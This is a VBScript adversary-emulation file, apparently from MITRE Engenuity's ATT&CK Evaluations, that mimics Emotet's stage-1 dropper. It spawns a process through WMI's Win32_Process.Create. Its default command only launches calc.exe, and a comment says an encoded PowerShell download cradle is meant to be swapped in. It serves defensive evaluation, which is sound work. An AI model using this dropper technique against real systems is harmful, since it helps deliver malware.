'=============================================================================================
'
'       Filename:  drop_emotet_stage1.vbs
'
'    Description:  This program emulates Emotet's stage 1 VBS dropper.
'                  This program spawns a new process using WMI's
'                  Win32_Process.Create class. Emotet has used WMI in
'                  this manner to execute a PowerShell download-cradle.
'   
'        Version:  1.0
'        Created:  March 1st, 2021
'
'      Author(s):  Michael C. Long II
'   Organization:  MITRE Engenuity
'
'  References(s): https://www.carbonblack.com/blog/cb-tau-threat-intelligence-notification-emotet-utilizing-wmi-to-launch-powershell-encoded-code/
'
'=============================================================================================

'<Start-ATT&CK-Evals-Delimiter>

Function Create_Process_with_WMI(desired_process)
    ' Execute WMI on current computer
    target_computer = "."

    ' Create WMI process object
    Set wmi_object = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & target_computer & "\root\cimv2")
    wmi_object.Get("Win32_ProcessStartup")
    Set wmi_process = GetObject("winmgmts:root\cimv2:Win32_Process")
    
    ' Execute WMI method "Win32_Process.Create"
    succeeded = wmi_process.Create( desired_process, null, null, null)

    ' Capture the return value
    Create_Process_with_WMI = succeeded
End Function


Function Main()
    ' Set standard out to object to enable printing to console
    Dim StdOut : Set StdOut = CreateObject("Scripting.FileSystemObject").GetStandardStream(1)

    ' Handle command line arguments; this enables unit testing
    process_to_spawn = ""
    If (WScript.Arguments.Count > 0) Then
        process_to_spawn = WScript.Arguments.Item(0)
    Else
        '*******************************************************************
        ' use "generate_emotet_dropper.py" to swap process_to_spawn command
        ' with encoded powershell 1 liner
        '*******************************************************************
        process_to_spawn = "powershell.exe -c Start-Process calc.exe"
    End If
    
    ' create process with WMI
    return_value = Create_Process_with_WMI(process_to_spawn)
    
    ' check for error conditions
    If (return_value > 0) Then
        WScript.Echo "Call to 'Create_Process_with_WMI' failed with exit code: ", return_value
        WScript.Quit(return_value)
        ' In case of error, lookup return code at:
        ' https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/create-method-in-class-win32-process
    End If

    WScript.Echo "Call to 'Create_Process_with_WMI' succeeded with exit code: ", return_value
    WScript.Quit(return_value)
End Function

Main()

'<End-ATT&CK-Evals-Delimiter>